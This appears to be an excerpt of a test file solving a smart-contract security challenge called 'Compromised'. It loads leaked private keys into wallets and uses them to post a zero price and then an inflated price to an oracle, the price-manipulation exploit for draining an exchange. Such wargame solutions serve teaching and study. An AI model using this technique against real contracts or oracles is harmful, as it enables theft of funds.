...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const wallets = [];
    for (const privateKey of compromisedKeys) {
      wallets.push(new Wallet(privateKey, ethers.provider));
    }

    // manipulate the price to be 0
    for (const wallet of wallets) {
        await oracle.connect(wallet).postPrice("DVNFT", ethers.constants.Zero);
    }
    ...
    // manipulate the price to be the exchange balance
    for (const wallet of wallets) {
        await oracle.connect(wallet).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
    }
